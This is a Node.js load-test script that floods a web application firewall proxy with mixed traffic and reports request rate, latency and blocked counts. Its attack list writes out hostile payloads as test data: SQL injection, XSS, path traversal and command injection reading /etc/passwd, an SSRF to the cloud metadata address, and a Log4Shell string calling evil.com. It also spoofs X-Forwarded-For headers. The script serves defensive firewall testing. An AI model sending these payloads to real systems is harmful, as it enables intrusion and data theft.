#!/usr/bin/env node
/**
 * WAF Proxy Load Test
 * ===================
 * Zero-dependency load test using Node.js built-in http module.
 *
 * Usage:
 *   node tests/load-test.js                          # defaults: 50 concurrent, 30s, localhost:8080
 *   node tests/load-test.js --concurrency 100 --duration 60 --target http://localhost:8080
 *
 * Traffic mix: 80% clean, 15% suspicious, 5% attack patterns
 */

'use strict';

const http = require('http');
const { URL } = require('url');

// ---------- Config ----------
const args = process.argv.slice(2);
function getArg(name, defaultVal) {
    const idx = args.indexOf(`--${name}`);
    return idx >= 0 && args[idx + 1] ? args[idx + 1] : defaultVal;
}

const CONCURRENCY = parseInt(getArg('concurrency', '50'));
const DURATION_SEC = parseInt(getArg('duration', '30'));
const TARGET = getArg('target', 'http://localhost:8080');

// ---------- Request Templates ----------
const CLEAN_PATHS = [
    '/', '/index.html', '/about', '/contact', '/products', '/api/data',
    '/css/styles.css', '/js/app.js', '/images/logo.png', '/favicon.ico',
    '/blog/post-1', '/blog/post-2', '/docs/getting-started',
    '/search?q=nodejs+express', '/products?page=2&sort=price',
];

const SUSPICIOUS_PATHS = [
    '/admin', '/wp-login.php', '/phpmyadmin', '/.env',
    '/wp-content/uploads/', '/administrator/index.php',
    '/robots.txt', '/xmlrpc.php', '/config.php', '/server-info',
];

const ATTACK_PAYLOADS = [
    "/search?q=' OR 1=1 --",
    "/search?q=<script>alert('xss')</script>",
    "/page?file=../../../../etc/passwd",
    "/api?cmd=;cat /etc/passwd",
    "/api?url=http://169.254.169.254/latest/meta-data",
    "/api?data=${jndi:ldap://evil.com/a}",
];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
];

const BAD_USER_AGENTS = [
    'sqlmap/1.7', 'nikto/2.1', 'nmap scripting engine', 'Wget/1.21',
];

// ---------- Stats ----------
let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let blockedCount = 0;
let latencies = [];
let statusCodes = {};

// ---------- Request Sender ----------
function makeRequest() {
    return new Promise((resolve) => {
        const roll = Math.random();
        let reqPath, ua;

        if (roll < 0.80) {
            // Clean request
            reqPath = CLEAN_PATHS[Math.floor(Math.random() * CLEAN_PATHS.length)];
            ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        } else if (roll < 0.95) {
            // Suspicious
            reqPath = SUSPICIOUS_PATHS[Math.floor(Math.random() * SUSPICIOUS_PATHS.length)];
            ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        } else {
            // Attack
            reqPath = ATTACK_PAYLOADS[Math.floor(Math.random() * ATTACK_PAYLOADS.length)];
            ua = Math.random() < 0.5
                ? BAD_USER_AGENTS[Math.floor(Math.random() * BAD_USER_AGENTS.length)]
                : USER_AGENTS[0];
        }

        const url = new URL(reqPath, TARGET);
        const start = Date.now();

        const req = http.get({
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            headers: {
                'User-Agent': ua,
                'Accept': 'text/html,application/json',
                'X-Forwarded-For': `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
            },
            timeout: 10000,
        }, (res) => {
            const elapsed = Date.now() - start;
            latencies.push(elapsed);
            totalRequests++;
            statusCodes[res.statusCode] = (statusCodes[res.statusCode] || 0) + 1;

            if (res.statusCode === 403) blockedCount++;
            else if (res.statusCode < 500) successCount++;
            else errorCount++;

            // Drain response
            res.resume();
            res.on('end', resolve);
        });

        req.on('error', () => {
            totalRequests++;
            errorCount++;
            resolve();
        });

        req.on('timeout', () => {
            req.destroy();
            totalRequests++;
            errorCount++;
            resolve();
        });
    });
}

// ---------- Worker ----------
async function worker(id, endTime) {
    while (Date.now() < endTime) {
        await makeRequest();
    }
}

// ---------- Report ----------
function percentile(arr, p) {
    if (arr.length === 0) return 0;
    const sorted = [...arr].sort((a, b) => a - b);
    const idx = Math.ceil((p / 100) * sorted.length) - 1;
    return sorted[Math.max(0, idx)];
}

function printReport(elapsedSec) {
    const rps = (totalRequests / elapsedSec).toFixed(1);
    const p50 = percentile(latencies, 50);
    const p95 = percentile(latencies, 95);
    const p99 = percentile(latencies, 99);
    const avg = latencies.length > 0 ? (latencies.reduce((a, b) => a + b, 0) / latencies.length).toFixed(1) : 0;
    const errRate = totalRequests > 0 ? ((errorCount / totalRequests) * 100).toFixed(1) : 0;

    console.log('\n');
    console.log('╔══════════════════════════════════════════════════╗');
    console.log('║          WAF Proxy Load Test Results             ║');
    console.log('╠══════════════════════════════════════════════════╣');
    console.log(`║  Target:       ${TARGET.padEnd(33)}║`);
    console.log(`║  Concurrency:  ${String(CONCURRENCY).padEnd(33)}║`);
    console.log(`║  Duration:     ${elapsedSec.toFixed(1).padEnd(30)}sec ║`);
    console.log('╠══════════════════════════════════════════════════╣');
    console.log(`║  Total Requests:  ${String(totalRequests).padEnd(30)}║`);
    console.log(`║  RPS:             ${rps.padEnd(30)}║`);
    console.log(`║  Successful:      ${String(successCount).padEnd(30)}║`);
    console.log(`║  Blocked (403):   ${String(blockedCount).padEnd(30)}║`);
    console.log(`║  Errors:          ${String(errorCount).padEnd(30)}║`);
    console.log(`║  Error Rate:      ${(errRate + '%').padEnd(30)}║`);
    console.log('╠══════════════════════════════════════════════════╣');
    console.log(`║  Avg Latency:     ${(avg + 'ms').padEnd(30)}║`);
    console.log(`║  P50 Latency:     ${(p50 + 'ms').padEnd(30)}║`);
    console.log(`║  P95 Latency:     ${(p95 + 'ms').padEnd(30)}║`);
    console.log(`║  P99 Latency:     ${(p99 + 'ms').padEnd(30)}║`);
    console.log('╠══════════════════════════════════════════════════╣');
    console.log('║  Status Code Distribution:                       ║');
    for (const [code, count] of Object.entries(statusCodes).sort()) {
        const pct = ((count / totalRequests) * 100).toFixed(1);
        console.log(`║    ${code}: ${String(count).padEnd(10)} (${pct}%)`.padEnd(51) + '║');
    }
    console.log('╚══════════════════════════════════════════════════╝');
    console.log('');

    // Exit code: 1 if error rate > 10% or P99 > 5000ms
    if (parseFloat(errRate) > 10 || p99 > 5000) {
        console.log('⚠️  FAIL: Error rate or latency exceeds threshold');
        process.exit(1);
    } else {
        console.log('✅ PASS: Load test within acceptable thresholds');
    }
}

// ---------- Main ----------
async function main() {
    console.log(`\n🔥 WAF Load Test — ${CONCURRENCY} concurrent workers for ${DURATION_SEC}s → ${TARGET}\n`);

    const startTime = Date.now();
    const endTime = startTime + (DURATION_SEC * 1000);

    // Progress indicator
    const progressTimer = setInterval(() => {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(0);
        const rps = totalRequests > 0 ? (totalRequests / ((Date.now() - startTime) / 1000)).toFixed(0) : 0;
        process.stdout.write(`\r  ${elapsed}s elapsed | ${totalRequests} requests | ${rps} RPS | ${blockedCount} blocked | ${errorCount} errors `);
    }, 1000);

    // Launch workers
    const workers = [];
    for (let i = 0; i < CONCURRENCY; i++) {
        workers.push(worker(i, endTime));
    }
    await Promise.all(workers);

    clearInterval(progressTimer);
    const elapsedSec = (Date.now() - startTime) / 1000;
    printReport(elapsedSec);
}

main().catch(err => {
    console.error('Load test failed:', err);
    process.exit(1);
});
